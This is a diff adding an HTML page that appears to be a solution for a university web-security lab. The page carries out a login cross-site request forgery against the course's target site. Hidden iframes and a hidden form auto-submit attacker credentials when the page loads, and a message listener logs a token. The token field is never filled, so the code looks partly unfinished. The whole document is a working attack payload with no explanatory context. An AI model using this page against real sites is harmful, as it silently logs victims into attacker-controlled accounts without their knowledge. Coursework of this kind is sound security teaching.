@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <body>
+    <iframe name="tokenFrame" src="http://cpsc4200.mpese.com/?csrfdefense=1&xssdefense=0"
+      style="display:none" aria-hidden="true"></iframe>
+    <iframe name="hiddenFrame" style="display:none" aria-hidden="true"></iframe>
+    <form name="f" method="post" 
+      action="http://cpsc4200.mpese.com/login?csrfdefense=1&xssdefense=0"
+      target="hiddenFrame">
+      <input id="username" name="username" type="hidden" value="attacker"> 
+      <input id="userpass" name="password" type="hidden" value="l33th4x">
+      <input id="csrf_token" name="csrf_token" type="hidden">
+    </form>
+    <script>
+      const iframe = document.getElementById("tokenFrame");
+      window.addEventListener('message', (event) => {
+        const data = event.data;
+        console.log('Token from iframe: ', data.token);
+      });
+      document.f.submit();
+    </script>
+  </body>
+</html>
